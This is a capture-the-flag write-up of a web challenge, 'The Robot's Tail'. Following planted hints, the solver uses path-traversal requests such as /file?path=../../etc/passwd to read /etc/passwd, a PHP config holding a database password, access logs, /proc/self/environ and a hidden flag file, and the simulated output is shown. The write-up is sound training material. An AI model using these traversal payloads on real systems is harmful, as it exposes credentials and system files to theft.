# The Robot's Tail

## Description
You enter a virtual maze, a labyrinth of shifting corridors and endless paths. A guardian robot patrols the floor, leaving a trail behind as it moves. Follow the path it carves, trace its movements carefully, and uncover the key it leads you to. Only by following the robotâ€™s trail can you reach the door to the next floor.

## Solve
**Flag:** `citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}`

- In this challenge, I first used the inspect element and checked the code. There, in hidden class, the following info was given:

```
<div class="hidden">
        <p>Start by checking what this site tells search engine bots in <a href="/robots.txt" style="color: #00bcd4;">robots.txt</a></p>
</div>
```

- Now we needed to go to the /robot.txt filee. So, I set one of the paths links to the robots.txt file and found this:

```
User-agent: *

# We value our digital privacy and have restricted access to certain system-level configurations.
Disallow: /file?path=../../etc/passwd
Disallow: /file?path=../../../etc/passwd

# Hint for curious explorers: 
# Sometimes system files like /etc/passwd can reveal interesting information...
# But remember to respect privacy boundaries!
```

- Now, setting the path `/file?path=../../etc/passwd` and going there, we get: 

```
"root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
            "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
            "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
            "webadmin:x:1000:1000:Check the web server config at /var/www/html/config.php:/home/webadmin:/bin/bash\n"
``` 

- This time, it says to check the configs. So setting the path accordingly and going to that endpoint, we find:

```
"<?php\n"
            "// Database configuration\n"
            "$db_host = 'localhost';\n"
            "$db_user = 'admin';\n"
            "$db_pass = 's3cr3t_p@ssw0rd';\n"
            "// Debug info: Check the access logs for unusual activity\n"
            "// Log location: /var/log/apache2/access.log\n"
            "?>"
```

- This time we go to the access logs to get this info:

```
"127.0.0.1 - - [01/Jan/2023:10:30:45 +0000] \"GET / HTTP/1.1\" 200 1234 \"-\" \"Mozilla/5.0\"\n"
            "192.168.1.100 - - [01/Jan/2023:10:31:22 +0000] \"GET /file?path=../../etc/passwd HTTP/1.1\" 200 567 \"-\" \"Python-urllib\"\n"
            "10.0.0.50 - - [01/Jan/2023:10:32:15 +0000] \"GET /admin HTTP/1.1\" 404 289 \"-\" \"curl\"\n"
            "# Interesting environment variables might be found at /proc/self/environ\n"
            "203.0.113.5 - - [01/Jan/2023:10:33:01 +0000] \"POST /login HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0\"\n"
```

- Since we already checked the passwd path, we check the environ path and get this:

```
"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
            "HOSTNAME=web-server-01\n"
            "USER=www-data\n"
            "HOME=/var/www\n"
            "SECRET_LOCATION=/home/ctf/.secret\n"
            "PWD=/var/www/html\n"
            "LANG=C.UTF-8\n"
            "SHLVL=1\n"
```

- Here, we finally get the path to the secret location. Using that, we get: 

```
"Directory listing for /home/ctf/.secret:\n"
            "total 12\n"
            "drwx------ 2 ctf ctf 4096 Jan  1 10:00 .\n"
            "drwxr-xr-x 5 ctf ctf 4096 Jan  1 09:55 ..\n"
            "-r-------- 1 ctf ctf   48 Jan  1 10:00 flag.txt\n"
            "\n"
```

- Now finally going to the path `/home/ctf/.secret/flag.txt`, we get the flag.
